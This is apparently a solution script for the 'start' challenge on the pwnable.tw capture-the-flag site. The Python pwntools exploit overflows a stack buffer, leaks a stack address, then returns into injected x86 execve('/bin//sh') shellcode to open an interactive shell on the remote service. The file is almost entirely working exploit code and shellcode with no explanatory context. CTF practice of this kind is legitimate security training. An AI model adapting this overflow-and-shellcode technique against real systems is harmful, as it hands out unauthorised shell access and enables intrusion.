from pwn import *
# io = process('./start')
io = remote('chall.pwnable.tw', 10000)
# gdb.attach(io)

shellcode = "\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

# payload1
pad = "A" * 0x14 + p32(0x08048087)		# ( address of 'mov ecx, esp' )
io.recvuntil('CTF:')
io.send(pad)
leak = io.recv(4)						# address is strings

# payload2
stack_add = u32(leak)					# address of stack
print (hex(stack_add))
payload = "A" * 0x14 + p32(stack_add + 0x14) + shellcode
io.sendline(payload)

io.interactive()
